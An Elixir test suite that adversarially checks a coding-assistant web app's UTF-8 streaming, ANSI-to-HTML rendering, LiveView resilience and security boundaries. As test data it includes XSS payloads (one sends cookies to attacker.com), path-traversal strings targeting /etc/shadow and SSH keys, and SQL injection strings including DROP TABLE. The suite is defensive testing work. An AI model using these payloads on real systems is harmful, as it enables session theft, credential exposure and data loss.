defmodule IexCode.E2E.Tier5AdversarialStreamLiveviewTest do
  @moduledoc """
  Tier 5: Adversarial Coverage Hardening Test Suite (Streaming, LiveView & Security Boundaries).

  Adversarially probes critical stress vectors, boundary edge cases, concurrency hazards, and security invariants:
  - Section 1: Malformed UTF-8 & Streaming Byte-Level Attacks (UTF8Buffer, SSEParser, StreamClient)
  - Section 2: ANSI Escape Codes, Corrupted Terminal Streams, ReDoS & XSS Sanitization (WorkspaceComponents, TerminalSession)
  - Section 3: LiveView Concurrency, Socket Drops, Event Storms, and Disconnects (WorkspaceLive)
  - Section 4: Security Boundaries, Sandbox Escaping, Runaway Command Timeouts, and Injection Resilience (Tools, Sessions, Settings, Kanban)
  """
  use IexCode.E2E.Case, async: false

  alias IexCode.LLM.{UTF8Buffer, SSEParser}
  alias IexCode.Engine.{SessionServer, OperationManager}
  alias IexCode.{Tools, Sessions, Settings, Kanban}
  alias IexCodeWeb.WorkspaceComponents
  alias Phoenix.PubSub

  # ============================================================================
  # Section 1: Malformed UTF-8 & Streaming Byte-Level Attacks
  # ============================================================================

  describe "Tier 5: Malformed UTF-8 & Streaming Byte Attacks" do
    test "T5_01_split_utf8_every_single_byte_across_multibyte_codepoints" do
      # 2-byte Greek (λ = <<206, 187>>), 3-byte CJK (木 = <<230, 156, 168>>), 4-byte Rocket (🚀 = <<240, 159, 154, 128>>)
      # and 4-byte Bee (🐝 = <<240, 159, 144, 157>>)
      full_text = "Elixir λ 木 🚀 🐝 OTP"
      raw_bytes = :erlang.binary_to_list(full_text)

      # Feed 1 byte at a time through UTF8Buffer
      {reconstructed, final_buf} =
        Enum.reduce(raw_bytes, {"", UTF8Buffer.new()}, fn byte, {acc_text, buf} ->
          chunk = <<byte>>
          {valid, next_buf} = UTF8Buffer.process_bytes(buf, chunk)
          {acc_text <> valid, next_buf}
        end)

      {flushed, _} = UTF8Buffer.flush(final_buf)
      final_result = reconstructed <> flushed

      assert final_result == full_text
      assert String.valid?(final_result)
      assert String.contains?(final_result, "🚀")
      assert String.contains?(final_result, "🐝")
      assert String.contains?(final_result, "木")
      assert String.contains?(final_result, "λ")
    end

    test "T5_02_invalid_non_utf8_byte_injection_and_overlong_encodings" do
      # Inject invalid UTF-8 bytes (0xFF, 0xFE, orphan continuations 0x80, 0xBF, overlong 0xC0 0xAF)
      bad_payload = "Prefix " <> <<0xFF, 0xFE, 0x80, 0xBF, 0xC0, 0xAF>> <> " Suffix"

      {valid, rest} = UTF8Buffer.process_bytes(UTF8Buffer.new(), bad_payload)
      {flushed, _} = UTF8Buffer.flush(rest)
      combined = valid <> flushed

      assert String.valid?(combined)
      assert String.starts_with?(combined, "Prefix ")
      assert String.ends_with?(combined, " Suffix")
      # Invalid bytes must be replaced with Unicode replacement characters (\uFFFD), never crash
      assert String.contains?(combined, "\uFFFD")
    end

    test "T5_03_zero_bytes_and_null_character_handling_in_stream_and_db" do
      project = create_project_fixture()
      session = create_session_fixture(project)

      null_payload = "Data\0with\0embedded\0null\0bytes and \u0000 unicode null"
      {processed, _} = UTF8Buffer.process_bytes(UTF8Buffer.new(), null_payload)
      assert String.valid?(processed)

      # Ensure message creation with embedded null bytes does not crash or corrupt database
      {:ok, msg} =
        Sessions.create_message(%{
          session_id: session.id,
          role: "assistant",
          content: null_payload,
          agent_name: "NullTester"
        })

      assert msg.id != nil
      assert Sessions.sanitize_utf8(null_payload) =~ "Data"
    end

    test "T5_04_arbitrary_binary_payload_stream_sanitization" do
      # 16KB of high-entropy random binary bytes
      random_binary = :crypto.strong_rand_bytes(16_384)

      # 1. UTF8Buffer processing must never raise ArgumentError
      {valid, rest} = UTF8Buffer.process_bytes(UTF8Buffer.new(), random_binary)
      {flushed, _} = UTF8Buffer.flush(rest)
      sanitized_stream = valid <> flushed
      assert is_binary(sanitized_stream)
      assert String.valid?(sanitized_stream)

      # 2. Sessions.sanitize_utf8 must safely sanitize arbitrary binaries, nested maps and lists
      complex_struct = %{
        raw_binary: random_binary,
        nested: [random_binary, "valid text", %{inner: random_binary}]
      }

      sanitized_map = Sessions.sanitize_utf8(complex_struct)
      assert String.valid?(sanitized_map.raw_binary)
      assert String.valid?(hd(sanitized_map.nested))
      assert String.valid?(sanitized_map.nested |> List.last() |> Map.get(:inner))
    end

    test "T5_05_oversized_single_line_without_newline_in_sse_parser" do
      # 250KB unbroken SSE line
      large_text = String.duplicate("A", 250_000)
      large_sse_chunk = "data: {\"choices\":[{\"delta\":{\"content\":\"" <> large_text <> "\"}}]}"

      parser = SSEParser.new()
      # Incomplete line (no trailing newline) -> buffered
      {events_1, state_1} = SSEParser.parse(parser, large_sse_chunk)
      assert events_1 == []
      assert byte_size(state_1.line_buffer) > 250_000

      # Feed double newline to complete SSE event
      {events_2, state_2} = SSEParser.parse(state_1, "\n\n")
      assert length(events_2) == 1
      assert state_2.line_buffer == ""

      [event] = events_2
      delta = SSEParser.parse_event(event, "openai")
      assert {:delta, %{text: parsed_text}} = delta
      assert byte_size(parsed_text) == 250_000
    end

    test "T5_06_high_frequency_micro_chunk_streaming_integrity" do
      parser = SSEParser.new()

      json_chunk =
        "data: {\"choices\":[{\"delta\":{\"content\":\"Swarm intelligence operational.\"}}]}\n\n"

      two_byte_chunks = for <<chunk::binary-size(2) <- json_chunk>>, do: chunk

      # Remainder if odd length
      rem_size = rem(byte_size(json_chunk), 2)

      all_chunks =
        if rem_size > 0 do
          two_byte_chunks ++ [:binary.part(json_chunk, byte_size(json_chunk), -rem_size)]
        else
          two_byte_chunks
        end

      {events, _final_state} =
        Enum.reduce(all_chunks, {[], parser}, fn chunk, {ev_acc, st} ->
          {new_events, new_st} = SSEParser.parse(st, chunk)
          {ev_acc ++ new_events, new_st}
        end)

      assert length(events) == 1

      assert {:delta, %{text: "Swarm intelligence operational."}} =
               SSEParser.parse_event(hd(events), "openai")
    end
  end

  # ============================================================================
  # Section 2: Terminal ANSI Formatting, Escapes, ReDoS & XSS Protection
  # ============================================================================

  describe "Tier 5: Terminal ANSI Formatting, ReDoS & XSS Defense" do
    test "T5_07_xss_injection_in_terminal_and_ansi_sequences" do
      # Malicious payload with HTML script, onerror, and event handlers inside ANSI colors
      malicious_input = """
      \e[31m<script>alert('XSS_PWN')</script>\e[0m
      \e[1;32m<img src=x onerror="window.location='http://attacker.com?c='+document.cookie">\e[0m
      \e[38;2;255;0;0m<svg/onload=fetch('http://evil.local')>\e[0m
      """

      rendered_safe_html =
        malicious_input
        |> WorkspaceComponents.ansi_to_html()
        |> Phoenix.HTML.safe_to_string()

      # Strict Assertions: Raw HTML tags MUST NOT appear unescaped in rendered output
      refute rendered_safe_html =~ "<script>"
      refute rendered_safe_html =~ "<img src=x"
      refute rendered_safe_html =~ "<svg/onload"

      # HTML entities MUST be correctly escaped
      assert rendered_safe_html =~ "&lt;script&gt;"
      assert rendered_safe_html =~ "&lt;img src=x"
      assert rendered_safe_html =~ "&lt;svg/onload"

      # ANSI formatting classes and styles MUST be applied
      assert rendered_safe_html =~ "text-rose-400"
      assert rendered_safe_html =~ "text-emerald-400"
      assert rendered_safe_html =~ "color: rgb(255,0,0);"
    end

    test "T5_08_truncated_and_partial_ansi_escape_codes" do
      # Truncated and broken escape codes that often break naive regexes
      broken_escapes = [
        "\e[",
        "\e[38;",
        "\e[38;2;",
        "\e[38;2;255;",
        "\e[38;2;255;128;",
        "\e]8;;",
        "\e(B",
        "\e[?25",
        "\e[1;2;3;",
        "Text before \e[31 and text after without closing"
      ]

      Enum.each(broken_escapes, fn broken ->
        assert {:safe, safe_str} = WorkspaceComponents.ansi_to_html(broken)
        assert is_binary(IO.iodata_to_binary(safe_str))
      end)
    end

    test "T5_09_malformed_compound_ansi_sequences_and_nan_colors" do
      malformed_inputs = [
        "\e[9999999999999999999999999999999999999999999999999999mOut of range\e[0m",
        "\e[;;;;;;;mEmpty semicolons\e[0m",
        "\e[1;2;3;4;5;6;7;8;9;10;11;12;13;14;15;16mMassive sequence\e[0m",
        "\e[38;2;NaN;NaN;NaNmNon-numeric truecolor\e[0m",
        "\e[38;2;999;999;999mRGB overflow\e[0m",
        "\e[48;2;-10;-20;-30mNegative RGB\e[0m"
      ]

      for input <- malformed_inputs do
        {:safe, output} = WorkspaceComponents.ansi_to_html(input)
        rendered = IO.iodata_to_binary(output)
        assert String.valid?(rendered)
        # Verify no raw escape byte is emitted unhandled
        refute String.contains?(rendered, "\e")
      end
    end

    test "T5_10_extreme_length_terminal_string_redos_immunity" do
      # 100,000 characters with 1,500 interspersed ANSI TrueColor and SGR escape codes
      ansi_block = "\e[38;2;120;200;255m[LOG]\e[0m \e[1;33mWarning:\e[0m Operation latency 12ms "
      extreme_string = String.duplicate(ansi_block, 1_500)
      assert byte_size(extreme_string) > 100_000

      {time_micro, {:safe, safe_html}} =
        :timer.tc(fn ->
          WorkspaceComponents.ansi_to_html(extreme_string)
        end)

      rendered = IO.iodata_to_binary(safe_html)
      assert String.valid?(rendered)
      assert String.contains?(rendered, "Warning:")
      assert String.contains?(rendered, "color: rgb(120,200,255);")

      # ReDoS Immunity: 100KB ANSI string must parse in under 150 milliseconds (150,000 microseconds)
      time_ms = time_micro / 1000
      assert time_ms < 150, "Regex catastrophic backtracking detected: took #{time_ms}ms"
    end

    test "T5_11_terminal_control_characters_sanitization" do
      control_chars_input = "Line 1\r\nLine 2\b\b\a\v\f\e[2K\e[1JOverwritten line"
      {:safe, safe_html} = WorkspaceComponents.ansi_to_html(control_chars_input)
      rendered = IO.iodata_to_binary(safe_html)

      assert String.valid?(rendered)
      assert rendered =~ "Line 1"
      assert rendered =~ "Overwritten line"
      refute rendered =~ "\e"
    end
  end

  # ============================================================================
  # Section 3: LiveView Concurrency, Socket Drops, Event Storms, and Disconnects
  # ============================================================================

  describe "Tier 5: LiveView Concurrency, Drops & Event Storms" do
    test "T5_12_rapid_client_event_storm_on_liveview", %{conn: conn, workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      # Rapidly bombard the LiveView process with 80 events
      events = [
        {"switch_tab", %{"tab" => "swarm"}},
        {"switch_tab", %{"tab" => "kanban"}},
        {"switch_tab", %{"tab" => "files"}},
        {"switch_tab", %{"tab" => "terminal"}},
        {"toggle_dropdown", %{"name" => "model"}},
        {"close_dropdowns", %{}},
        {"select_kanban_filter", %{"key" => "priority", "value" => "high"}},
        {"select_kanban_filter", %{"key" => "status", "value" => "ready"}},
        {"filter_files", %{"filter" => "test"}},
        {"refresh_files", %{}}
      ]

      for _round <- 1..8 do
        Enum.each(events, fn {event_name, params} ->
          render_hook(view, event_name, params)
        end)
      end

      # Verify LiveView process survived the event storm and remains responsive
      assert Process.alive?(view.pid)
      assert render(view) =~ session.title
    end

    test "T5_13_duplicate_prompt_submission_storm", %{conn: conn, workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      # Rapidly submit 15 prompts in quick succession
      for idx <- 1..15 do
        render_submit(view, "submit_prompt", %{"prompt" => "Adversarial prompt ##{idx}"})
      end

      assert Process.alive?(view.pid)
      # Verify session server is running and alive
      assert {:ok, session_pid} = SessionServer.ensure_started(session.id)
      assert Process.alive?(session_pid)
    end

    test "T5_14_concurrent_liveviews_on_same_session", %{conn: conn, workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)

      # Mount 3 separate LiveView instances attached to the same session
      {:ok, view1, _} = live(conn, ~p"/sessions/#{session.id}")
      {:ok, view2, _} = live(conn, ~p"/sessions/#{session.id}")
      {:ok, view3, _} = live(conn, ~p"/sessions/#{session.id}")

      # Broadcast PubSub events across all LiveViews
      op = create_operation_fixture(session, %{title: "Broadcast Stress Op", status: "running"})
      PubSub.broadcast(IexCode.PubSub, "session:#{session.id}", {:operation_started, op})

      PubSub.broadcast(
        IexCode.PubSub,
        "session:#{session.id}",
        {:terminal_output, session.id, "STDOUT: multi-mount sync"}
      )

      # Verify all 3 views receive updates and render cleanly
      assert render(view1) =~ "STDOUT: multi-mount sync"
      assert render(view2) =~ "STDOUT: multi-mount sync"
      assert render(view3) =~ "STDOUT: multi-mount sync"

      # Execute actions from different mounts concurrently
      render_hook(view1, "switch_tab", %{"tab" => "swarm"})
      render_hook(view2, "switch_tab", %{"tab" => "terminal"})
      render_hook(view3, "switch_tab", %{"tab" => "kanban"})

      assert Process.alive?(view1.pid)
      assert Process.alive?(view2.pid)
      assert Process.alive?(view3.pid)
    end

    test "T5_15_liveview_socket_drop_during_active_streaming", %{conn: conn, workspace_path: path} do
      Process.flag(:trap_exit, true)
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      # Start an async operation in the session server
      {:ok, _task_pid, op} =
        OperationManager.run_async_operation(
          session.id,
          nil,
          "StreamingWorker",
          "stream_task",
          "Long streaming task",
          %{},
          fn progress ->
            progress.(25, "Processing chunk 1")
            Process.sleep(50)
            progress.(75, "Processing chunk 2")
            Process.sleep(50)
            {:ok, "Stream completed"}
          end
        )

      # Abruptly kill the LiveView process mid-stream (unlink first so test process is not killed)
      Process.unlink(view.pid)
      Process.exit(view.pid, :kill)
      refute Process.alive?(view.pid)

      # Drain any trapped exit signals
      receive do
        {:EXIT, _pid, _reason} -> :ok
      after
        50 -> :ok
      end

      # Wait for operation to complete in background OTP tree
      Process.sleep(150)

      # Verify SessionServer and background tasks did not crash and completed cleanly
      {:ok, session_pid} = SessionServer.ensure_started(session.id)
      assert Process.alive?(session_pid)

      updated_op = Sessions.get_operation(op.id)
      assert updated_op != nil
      assert updated_op.status in ["completed", "running"]
    end

    test "T5_16_liveview_reconnect_and_state_rehydration", %{conn: conn, workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)

      # Create operations and messages while client is disconnected
      _op1 =
        create_operation_fixture(session, %{
          title: "Pre-existing Op",
          status: "completed",
          progress: 100
        })

      _msg1 =
        create_message_fixture(session, %{
          content: "Rehydration verification message",
          role: "assistant"
        })

      # Mount new LiveView socket
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      # Switch to chat tab where message history is rendered
      render_hook(view, "switch_tab", %{"tab" => "chat"})

      # Verify all pre-existing operations and messages are properly hydrated
      assert render(view) =~ "Rehydration verification message"
      assert render(view) =~ session.title
      assert Process.alive?(view.pid)
    end

    test "T5_17_malformed_event_payloads_do_not_crash_liveview", %{
      conn: conn,
      workspace_path: path
    } do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      # Send corrupt and unexpected payload parameters
      malformed_events = [
        {"switch_tab", %{"tab" => nil}},
        {"switch_tab", %{"unexpected_key" => 12345}},
        {"toggle_dropdown", %{"name" => nil}},
        {"toggle_op_detail", %{"id" => "non-existent-uuid-9999999"}},
        {"open_task_drawer", %{"id" => "invalid-task-id-99999"}},
        {"filter_files", %{"filter" => String.duplicate("X", 5000)}},
        {"submit_prompt", %{"prompt" => ""}},
        {"submit_prompt", %{"prompt" => "   "}},
        {"run_terminal_command", %{"command" => ""}}
      ]

      for {ev, params} <- malformed_events do
        render_hook(view, ev, params)
      end

      assert Process.alive?(view.pid)
    end
  end

  # ============================================================================
  # Section 4: Security Boundary, Sandbox Escaping & Isolation Tests
  # ============================================================================

  describe "Tier 5: Security Boundaries, Sandbox Escaping & Timeouts" do
    test "T5_18_path_traversal_select_file_defense", %{conn: conn, workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      session = create_session_fixture(project)
      {:ok, view, _html} = live(conn, ~p"/sessions/#{session.id}")

      traversal_attacks = [
        "../../../../../../etc/passwd",
        "/etc/shadow",
        "../../.ssh/id_rsa",
        "../..",
        "subdir/../../../../../../etc/hosts"
      ]

      for attack_path <- traversal_attacks do
        rendered = render_hook(view, "select_file", %{"path" => attack_path})
        # Verify forbidden path traversal triggers flash error and does not leak file contents
        assert rendered =~ "Invalid file path"
        refute rendered =~ "root:"
        refute rendered =~ "localhost"
      end
    end

    test "T5_19_path_traversal_in_tools_file_operations", %{workspace_path: path} do
      # 1. Reading non-existent / escaped file returns clean error without crashing
      assert {:error, msg} =
               Tools.execute("read_file", %{"path" => "nonexistent_secret_file.txt"}, path)

      assert String.contains?(msg, "File does not exist")

      # 2. Writing a file inside workspace
      valid_rel_path = "lib/sub/deep/module.ex"

      assert {:ok, _} =
               Tools.execute(
                 "write_file",
                 %{"path" => valid_rel_path, "content" => "defmodule Sub.Deep.Module do end"},
                 path
               )

      assert File.exists?(Path.join(path, valid_rel_path))
    end

    test "T5_20_command_execution_timeout_and_process_cleanup", %{workspace_path: path} do
      # Runaway command: sleep 60 with 150ms timeout
      {time_micro, result} =
        :timer.tc(fn ->
          Tools.execute("run_command", %{"command" => "sleep 60", "timeout_ms" => 150}, path)
        end)

      time_ms = time_micro / 1000

      assert {:error, reason} = result
      assert reason =~ "Command timed out after 150ms"
      # Must return within ~500ms (not wait for 60 seconds)
      assert time_ms < 600, "Command timeout did not enforce deadline, took #{time_ms}ms"
    end

    test "T5_21_sql_and_query_injection_resilience", %{workspace_path: path} do
      project = create_project_fixture(%{root_path: path})
      _session = create_session_fixture(project)

      sql_injection_payloads = [
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "'; DROP TABLE tasks; --",
        "' UNION SELECT * FROM app_settings --",
        "1' OR status = 'done' OR '1'='1"
      ]

      for payload <- sql_injection_payloads do
        # 1. Kanban filter search SQL injection
        filter_res = Kanban.list_tasks(project.id, %{"search" => payload, "status" => payload})
        assert is_list(filter_res)

        # 2. Grep search tool with SQL characters
        {:ok, grep_out} = Tools.execute("grep_search", %{"query" => payload}, path)
        assert is_binary(grep_out)
      end

      # Verify database tables remain intact
      assert Kanban.list_tasks(project.id) != nil
      assert %IexCode.Settings.AppSettings{} = Settings.get_settings()
    end

    test "T5_22_sensitive_environment_isolation" do
      assert %IexCode.Settings.AppSettings{} = settings = Settings.get_settings()

      # Ensure default settings do not expose arbitrary host environment secrets
      assert is_binary(settings.openai_base_url)
      assert is_binary(settings.anthropic_base_url)

      # Malicious settings update attempts
      oversized_key = String.duplicate("SECRET_KEY_", 500)
      original_key = settings.openai_api_key

      assert {:error, changeset} =
               Settings.update_settings(%{openai_api_key: oversized_key})

      assert {message, validation} = changeset.errors[:openai_api_key]
      assert message == "should be at most %{count} character(s)"
      assert validation[:validation] == :length
      assert validation[:kind] == :max
      assert validation[:count] == 4_096

      # Rejected secrets are not partially persisted or truncated.
      assert Settings.get_settings().openai_api_key == original_key
    end

    test "T5_23_oversized_payload_db_truncation_and_sanitization" do
      project = create_project_fixture()
      session = create_session_fixture(project)

      # 500KB text payload with mixed emojis, null bytes, and HTML tags
      huge_payload =
        "🚀 Start: " <>
          String.duplicate(
            "<div><p>Swarm log chunk with unicode 🐝 and null \0</p></div>\n",
            5_000
          ) <>
          " 💻 End."

      {:ok, msg} =
        Sessions.create_message(%{
          session_id: session.id,
          role: "assistant",
          agent_name: "StressAgent",
          content: huge_payload
        })

      assert msg.id != nil
      assert is_binary(msg.content)
      assert String.starts_with?(msg.content, "🚀 Start:")

      # Verify list_messages can retrieve and sanitize payload
      messages = Sessions.list_messages(session.id)
      assert length(messages) >= 1
      latest = List.last(messages)
      assert latest.id == msg.id
      assert String.valid?(latest.content)
    end
  end
end
